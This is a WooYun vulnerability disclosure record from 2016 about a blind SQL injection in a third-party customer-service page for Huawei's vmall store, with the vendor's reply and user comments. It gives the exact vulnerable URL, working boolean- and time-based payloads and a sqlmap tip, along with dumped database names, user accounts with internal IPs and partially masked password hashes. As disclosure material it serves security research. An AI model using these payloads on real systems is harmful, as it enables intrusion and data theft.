{"id": 74269, "wybug_id": "wooyun-2016-0168190", "wybug_title": "华为商城某处注入漏洞影响大量数据", "wybug_corp": "华为技术有限公司", "wybug_author": "路人甲", "wybug_date": "2016-01-07 22:45", "wybug_open_date": "2016-02-22 16:48", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数据库账户权限过高", "注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-01-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-31：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-22：\t细节向公众公开  简要描述： 话说现在乌云主站要经常来打卡了。华为某站sql注入漏洞，大量数据。500强  老东家 还好吗。 详细说明：  漏洞是vmall的 也就是华为商城漏洞链接：http://robotim.vmall.com/live800/faq.jsp?companyId=8922问题参数 companyIdPlace: GETParameter: companyId    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: companyId=8922 AND 4969=4969    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: companyId=8922 AND SLEEP(5)---   漏洞证明：  记得复现的时候用上sqlmap的between tamper数据库信息：available databases [5]:[*] information_schema[*] live800_im[*] mysql[*] robot_im[*] test权限还挺大  是root的 database management system users [16]:[*] 'live800'@'10.120.74.128'[*] 'live800'@'10.120.74.129'[*] 'live800'@'10.120.74.130'[*] 'live800'@'10.120.74.131'[*] 'live800'@'10.159.145.252'[*] 'live800'@'10.159.145.253'[*] 'live800'@'127.0.0.1'[*] 'live800'@'localhost'[*] 'repl'@'10.120.74.128'[*] 'repl'@'10.120.74.129'[*] 'repl'@'10.120.74.130'[*] 'repl'@'10.120.74.131'[*] 'repl'@'10.159.145.25'[*] 'repl'@'10.159.145.251'[*] 'root'@'127.0.0.1'[*] 'root'@'localhost'密码也可以跑database management system users password hashes:[*] live800 [1]:    password hash: *A568ED516*******************4BDC4309DBFAF6D[*] repl [1]:    password hash: *809534247D21*******************9D8A854F45C31F3[*] root [1]:    password hash: *C0DD09B0C8B9DF*********3FF0E82E4688E021D8不得不说都是弱口令啊，cmd5就可以解密了 。 把红线当儿戏了把， 安全测试绩效都打C吧。还有库里面的信息就不跑了。听说终端公司要单独上市了？又一个500强诞生了。   修复方案：  你们应该懂。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2016-01-11 09:42 厂商回复： 感谢白帽子对华为公司安全的关注，经排查，此漏洞存在于为华为商城提供客服服务的第三方供应商站点，该站点与华为商城不存在直接的数据交互，泄露数据不涉及华为商城用户信息。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-01-08 00:42 |    \t\t番茄师傅 \t\t\t( 普通白帽子  |\t\t\t        Rank:346 漏洞数:92        | http://www.tomatoyu.com/)\t\t \n  老东家 还好吗。    \n     2016-01-08 00:51 |    \t\t小苹果 \t\t\t( 实习白帽子  |\t\t\t        Rank:74 漏洞数:22        | 只要锄头挥的好，哪有洞挖不到)\t\t \n  我靠，啊d新姿势    \n     2016-01-11 10:16 |    \t\tk0_pwn \t\t\t( 实习白帽子  |\t\t\t        Rank:96 漏洞数:13        | 专注且自由)\t\t \n  老东家，你还好吗    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}